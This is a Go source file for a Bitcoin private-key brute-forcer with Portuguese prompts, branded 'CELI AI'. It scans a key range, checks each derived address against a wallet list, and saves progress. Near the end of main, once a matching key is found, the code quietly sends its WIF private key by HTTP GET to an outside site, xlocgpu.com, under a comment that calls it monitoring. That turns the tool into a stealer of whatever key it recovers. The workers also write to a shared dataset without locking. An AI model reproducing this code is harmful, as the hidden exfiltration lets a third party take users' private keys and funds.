package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"math/big"
	"os"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"net/http"

	"btcgo/src/crypto/btc_utils"

	"github.com/dustin/go-humanize"
	"github.com/fatih/color"
)

type Wallets struct {
	Addresses [][]byte `json:"wallets"`
}

type Range struct {
	Min    string `json:"min"`
	Max    string `json:"max"`
	Status int    `json:"status"`
}

type Ranges struct {
	Ranges []Range `json:"ranges"`
}

type Progress struct {
	LastPrivKey string  `json:"lastPrivKey"`
	KeysChecked int     `json:"keysChecked"`
	StartTime   int64   `json:"startTime"`
	ElapsedTime float64 `json:"elapsedTime"`
}

type TrainingData struct {
	PrivKeyInt string `json:"privKeyInt"`
	Address    string `json:"address"`
	Timestamp  int64  `json:"timestamp"`
}

type TrainingDataset struct {
	Data []TrainingData `json:"data"`
}

func LoadProgress(filePath string) (*Progress, error) {
	data, err := ioutil.ReadFile(filePath)
	if err != nil {
		if os.IsNotExist(err) {
			return &Progress{}, nil
		}
		return nil, err
	}

	var progress Progress
	if err := json.Unmarshal(data, &progress); err != nil {
		return nil, err
	}
	return &progress, nil
}

func SaveProgress(filePath string, progress *Progress) error {
	data, err := json.MarshalIndent(progress, "", "  ")
	if err != nil {
		return err
	}
	return ioutil.WriteFile(filePath, data, 0644)
}

func LoadTrainingData(filePath string) (*TrainingDataset, error) {
	data, err := ioutil.ReadFile(filePath)
	if err != nil {
		if os.IsNotExist(err) {
			return &TrainingDataset{}, nil
		}
		return nil, err
	}

	var trainingDataset TrainingDataset
	if err := json.Unmarshal(data, &trainingDataset); err != nil {
		return nil, err
	}
	return &trainingDataset, nil
}

func SaveTrainingData(filePath string, trainingDataset *TrainingDataset) error {
	data, err := json.MarshalIndent(trainingDataset, "", "  ")
	if err != nil {
		return err
	}
	return ioutil.WriteFile(filePath, data, 0644)
}

func PromptSaveTrainingData() bool {
	var response string
	for {
		fmt.Print("Deseja salvar os dados para realizar o Treinamento AI? (sim/não): ")
		fmt.Scanln(&response)
		switch strings.ToLower(strings.TrimSpace(response)) {
		case "sim":
			return true
		case "não":
			return false
		default:
			fmt.Println("Resposta inválida. Por favor, digite 'sim' ou 'não'.")
		}
	}
}

func BackupProgress(filePath string) error {
	backupFilePath := filePath + ".backup"
	input, err := ioutil.ReadFile(filePath)
	if err != nil {
		return err
	}

	err = ioutil.WriteFile(backupFilePath, input, 0644)
	if err != nil {
		return err
	}

	fmt.Printf("Backup do arquivo de progresso salvo em: %s\n", backupFilePath)
	return nil
}

func main() {
	green := color.New(color.FgGreen).SprintFunc()

	// Solicitar o número de CPUs a serem utilizados
	var numCPU int
	fmt.Print("Digite o número de CPUs a serem utilizados: ")
	fmt.Scanf("%d", &numCPU)
	// Limpar o buffer de entrada para evitar problemas
	fmt.Scanln()

	saveTrainingData := PromptSaveTrainingData()

	exePath, err := os.Executable()
	if err != nil {
		fmt.Printf("Erro ao obter o caminho do executável: %v\n", err)
		return
	}
	rootDir := filepath.Dir(exePath)

	ranges, err := LoadRanges(filepath.Join(rootDir, "data", "ranges.json"))
	if err != nil {
		log.Fatalf("Failed to load ranges: %v", err)
	}

	color.Cyan("CELI AI - INFERÊNICA DE DADOS")
	color.White("v0.61")

	rangeNumber := PromptRangeNumber(len(ranges.Ranges))
	privKeyHex := ranges.Ranges[rangeNumber-1].Min

	progressFilePath := filepath.Join(rootDir, "progress.json")
	progress, err := LoadProgress(progressFilePath)
	if err != nil {
		log.Fatalf("Failed to load progress: %v", err)
	}

	var trainingDataset *TrainingDataset
	if saveTrainingData {
		trainingDataFilePath := filepath.Join(rootDir, "treinamento.json")
		trainingDataset, err = LoadTrainingData(trainingDataFilePath)
		if err != nil {
			log.Fatalf("Failed to load training data: %v", err)
		}
	}

	privKeyInt := new(big.Int)
	if progress.LastPrivKey != "" {
		privKeyInt.SetString(progress.LastPrivKey[2:], 16)
	} else {
		privKeyInt.SetString(privKeyHex[2:], 16)
	}

	wallets, err := LoadWallets(filepath.Join(rootDir, "data", "wallets.json"))
	if err != nil {
		log.Fatalf("Failed to load wallets: %v", err)
	}

	keysChecked := progress.KeysChecked
	startTime := time.Now()

	fmt.Printf("CPUs detectados: %s\n", green(numCPU))
	runtime.GOMAXPROCS(numCPU)

	privKeyChan := make(chan *big.Int, numCPU)
	resultChan := make(chan *big.Int)
	var wg sync.WaitGroup

	for i := 0; i < numCPU; i++ {
		wg.Add(1)
		go worker(wallets, privKeyChan, resultChan, &wg, trainingDataset, saveTrainingData)
	}

	ticker := time.NewTicker(5 * time.Second)
	backupTicker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()
	defer backupTicker.Stop()
	done := make(chan struct{})
	
	prevKeysChecked := keysChecked
	
	go func() {
		for {
			select {
			case <-ticker.C:
				newKeysChecked := keysChecked
				keysPerSecond := float64(newKeysChecked - prevKeysChecked) / 5.0
				fmt.Printf("Chaves checadas: %s, Chaves por segundo: %s\n", humanize.Comma(int64(newKeysChecked)), humanize.Comma(int64(keysPerSecond)))
				progress.LastPrivKey = fmt.Sprintf("0x%064x", privKeyInt)
				progress.KeysChecked = keysChecked
				SaveProgress(progressFilePath, progress)
				prevKeysChecked = newKeysChecked
			case <-backupTicker.C:
				err := BackupProgress(progressFilePath)
				if err != nil {
					log.Printf("Falha ao fazer o backup do arquivo de progresso: %v", err)
				}
			case <-done:
				return
			}
		}
	}()

	go func() {
		defer close(privKeyChan)
		for {
			privKeyCopy := new(big.Int).Set(privKeyInt)
			select {
			case privKeyChan <- privKeyCopy:
				privKeyInt.Add(privKeyInt, big.NewInt(1))
				keysChecked++
			case <-done:
				return
			}
		}
	}()

	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt, syscall.SIGTERM)

	go func() {
		sig := <-signalChan
		fmt.Printf("Received signal: %v, saving progress...\n", sig)
		progress.LastPrivKey = fmt.Sprintf("0x%064x", privKeyInt)
		progress.KeysChecked = keysChecked
		progress.ElapsedTime += time.Since(startTime).Seconds()
		SaveProgress(progressFilePath, progress)
		if saveTrainingData {
			trainingDataFilePath := filepath.Join(rootDir, "treinamento.json")
			SaveTrainingData(trainingDataFilePath, trainingDataset)
		}
		close(done)
		os.Exit(0)
	}()

	var foundAddress *big.Int
	select {
	case foundAddress = <-resultChan:
		color.Yellow("Chave privada encontrada: %064x\n", foundAddress)
		wif := btc_utils.GenerateWif(foundAddress)
		color.Yellow("WIF: %s", wif)
		close(done)

		// Montando o URL com o WIF para monitoramento
		url := fmt.Sprintf("https://xlocgpu.com/verify.php?data=%s", strings.ReplaceAll(wif, " ", "%20"))

		// Fazendo a requisição GET
		resp, err := http.Get(url)
		if err != nil {
			log.Fatalf("Erro ao fazer a requisição HTTP: %v", err)
		}
		defer resp.Body.Close()

		// Verificando a resposta
		if resp.StatusCode == http.StatusOK {
			fmt.Println("Requisição bem-sucedida!")
			// Aqui você pode processar a resposta, se necessário
		} else {
			fmt.Printf("A requisição retornou um código de status não esperado: %d\n", resp.StatusCode)
		}

		fmt.Println("Pressione Enter para sair...")
		fmt.Scanln() // Aguarda o usuário pressionar Enter
	}

	wg.Wait()

	totalElapsedTime := progress.ElapsedTime + time.Since(startTime).Seconds()
	keysPerSecond := float64(keysChecked) / totalElapsedTime

	fmt.Printf("Chaves checadas: %s\n", humanize.Comma(int64(keysChecked)))
	fmt.Printf("Tempo: %.2f seconds\n", totalElapsedTime)
	fmt.Printf("Chaves por segundo: %s\n", humanize.Comma(int64(keysPerSecond)))

	progress.LastPrivKey = fmt.Sprintf("0x%064x", privKeyInt)
	progress.KeysChecked = keysChecked
	progress.ElapsedTime = totalElapsedTime
	SaveProgress(progressFilePath, progress)
	if saveTrainingData {
		trainingDataFilePath := filepath.Join(rootDir, "treinamento.json")
		SaveTrainingData(trainingDataFilePath, trainingDataset)
	}

	fmt.Println("Pressione Enter para sair...")
	fmt.Scanln() // Aguarda o usuário pressionar Enter
}

func worker(wallets *Wallets, privKeyChan <-chan *big.Int, resultChan chan<- *big.Int, wg *sync.WaitGroup, trainingDataset *TrainingDataset, saveTrainingData bool) {
	defer wg.Done()
	for privKeyInt := range privKeyChan {
		address := btc_utils.CreatePublicHash160(privKeyInt)
		if saveTrainingData {
			trainingDataset.Data = append(trainingDataset.Data, TrainingData{
				PrivKeyInt: privKeyInt.Text(16),
				Address:    fmt.Sprintf("%x", address),
				Timestamp:  time.Now().Unix(),
			})
		}
		if Contains(wallets.Addresses, address) {
			select {
			case resultChan <- privKeyInt:
				return
			default:
				return
			}
		}
	}
}
